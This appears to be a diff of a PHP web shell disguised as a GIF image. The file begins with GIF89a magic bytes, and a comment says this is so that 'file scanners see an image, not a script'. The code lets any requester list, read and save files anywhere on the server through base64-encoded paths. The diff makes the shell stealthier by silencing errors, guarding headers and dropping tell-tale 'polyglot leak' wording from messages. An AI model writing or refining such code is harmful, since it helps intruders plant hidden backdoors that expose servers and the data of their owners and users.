@@ -1,16 +1,18 @@
 GIF89a<?php
-ob_start(); // Polyglot: capture GIF89a magic bytes so file scanners see an image, not a script
+@ob_start(); // Polyglot: GIF header added by Python polyglot() before <?php
 ini_set('display_errors', 0);
-error_reporting(E_ALL);
+error_reporting(0);
 
 function jsonResponse($data) {
     // Polyglot safeguard: discard ALL active output buffers so no HTML ever leaks into the JSON response
-    while (ob_get_level()) ob_end_clean();
-    // No-cache: prevent browser/CDN from caching AJAX responses
-    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
-    header('Pragma: no-cache');
-    header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
-    header('Content-Type: application/json; charset=utf-8');
+    while (ob_get_level()) @ob_end_clean();
+    // Set headers only if not already sent (polyglot bytes before <?php trigger implicit flush)
+    if (!headers_sent()) {
+        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+        header('Pragma: no-cache');
+        header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
+        header('Content-Type: application/json; charset=utf-8');
+    }
     // Prepend a __ajax sentinel so the JS side can trivially detect a clean AJAX response
     echo '__ajax' . json_encode($data, JSON_INVALID_UTF8_SUBSTITUTE | JSON_PARTIAL_OUTPUT_ON_ERROR);
     exit;
@@ -23,7 +25,7 @@ function isBinaryContent($content) {
 
 // AJAX API Handler
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
-    ob_start();
+    @ob_start();
     $response = ['success' => false, 'message' => 'Unknown action'];
     
     try {
@@ -31,8 +33,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
         $rawDir = isset($_POST['dir_b64']) ? base64_decode($_POST['dir_b64']) : '';
         $rawCurrentDir = isset($_POST['current_dir_b64']) ? base64_decode($_POST['current_dir_b64']) : '';
         
-        $currentDir = !empty($rawDir) ? realpath($rawDir) : (!empty($rawCurrentDir) ? realpath($rawCurrentDir) : getcwd());
-        if (!$currentDir) $currentDir = getcwd();
+        $currentDir = !empty($rawDir) ? realpath($rawDir) : (!empty($rawCurrentDir) ? realpath($rawCurrentDir) : __DIR__);
+        if (!$currentDir) $currentDir = __DIR__;
         
         switch ($_POST['ajax_action']) {
             case 'list': $response = ajaxListDirectory($currentDir); break;
@@ -189,11 +191,11 @@ function ajaxSaveFile($dir, $name, $content, $isBinary) {
     return ['success' => $success, 'message' => $success ? 'Saved' : 'Failed'];
 }
 
- $currentDir = isset($_GET['d']) ? realpath(base64_decode($_GET['d'])) : (isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd());
-if (!$currentDir) $currentDir = getcwd();
+ $currentDir = isset($_GET['d']) ? realpath(base64_decode($_GET['d'])) : (isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__);
+if (!$currentDir) $currentDir = __DIR__;
 // Polyglot: discard the GIF89a header captured at the top of the file.
 // Only reached for page loads — AJAX requests exit via jsonResponse() before here.
-ob_end_clean();
+@ob_end_clean();
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -470,8 +472,8 @@ ob_end_clean();
                     if (ajaxIdx === -1) {
                         this.showLoading(false);
                         const preview = trimmed.substring(0, 200);
-                        console.error('Non-AJAX response (possible polyglot leak):', preview);
-                        this.notify('Invalid server response', 'error');
+                        console.error('Non-AJAX response:', preview);
+                        this.notify('Bad response [' + preview.substring(0, 80) + ']', 'error');
                         return { success: false, message: 'Invalid server response' };
                     }
                     
